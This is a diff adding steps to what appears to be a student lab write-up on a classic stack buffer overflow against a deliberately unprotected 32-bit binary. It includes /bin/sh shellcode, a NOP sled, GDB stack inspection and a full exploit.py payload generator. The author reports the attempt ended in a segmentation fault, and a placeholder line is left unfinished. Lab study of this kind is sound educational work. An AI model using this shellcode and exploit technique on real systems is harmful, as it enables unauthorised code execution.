@@ -47,6 +47,95 @@ To make the buffer overflow exploit possible, I compiled the code with the follo
 gcc -fno-stack-protector -z execstack -no-pie -m32 vuln.c -o vuln
 ```
 
+## Step 3: Writing the Exploit Payload
+I created a Python script (exploit.py) to generate a payload containing:
+
+A sequence of NOP (\x90) instructions added before the shellcode to execute /bin/sh. The purpose is to increase the chance of successful redirection so that if the return address lands anywhere in the NOP sled, the processor will “slide” down the NOPs until it reaches the shellcode.
+
+
+3. A guessed return address pointing somewhere into the NOP sled or shellcode
+
+```
+shellcode = (
+b"\x90" * 100 +  # NOP sled
+b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # push //sh
+b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"  # push /bin, mov ebx
+b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"  # execve syscall
+)
+
+```
+
+## Step 4: Finding the Offset and ESP Location with GDB
+I ran the compiled program in gdb and set breakpoints to pause execution before the return. Using info registers and x/32x $esp, I inspected the stack to estimate the correct memory location where the shellcode would be placed.
+```
+gdb ./vuln
+(gdb) break gets
+(gdb) run
+(gdb) info registers esp
+(gdb) x/32x $esp
+```
+I used the output to guess a return address that would point into the NOP sled or shellcode.
+
+## Step 5: Generating the Final Payload
+In this step, I wrote a Python script to generate the final exploit payload. This payload is designed to:
+
+Fill the buffer with 76 bytes of padding ("A" * 76) to reach the saved return address. 
+
+Overwrite the return address with the address of the buffer (0xffffcd60) where the shellcode is located.
+
+Include a NOP sled of 100 bytes to increase the success rate of the jump.
+
+Append shellcode that launches a shell (/bin/sh).
+
+Here is the content of the exploit.py script:
+
+```
+# exploit.py
+
+# 76 bytes to reach return address
+padding = b"A" * 76
+
+# Return address pointing to buffer start (NOP sled + shellcode location)
+ret_address = b"\x60\xcd\xff\xff"  # 0xffffcd60 (Little endian)
+
+# NOP sled to slide into the shellcode
+nops = b"\x90" * 100
+
+# Shellcode to launch /bin/sh
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+)
+
+# Full payload
+payload = padding + ret_address + nops + shellcode
+
+# Write payload to file
+with open("payload", "wb") as f:
+    f.write(payload)
+
+```
+
+To generate the payload:
+
+```
+python3 exploit.py
+```
+This creates a file named payload, which can then be passed as input to the vulnerable program.
+
+
+## Step 6: Executing the Exploit
+I passed the payload to the vulnerable program using input redirection:
+
+```
+./vuln < payload
+```
+
+## Step 7: Observing the Result
+Instead of launching a shell, the program crashed with a segmentation fault. Despite adjusting the return address and inspecting the stack several times, I wasn't able to redirect execution to my shellcode.
+
+Seg error pic here
 
 
 ![Figure 1: The Markdown Mark](images/markdown-red.png)
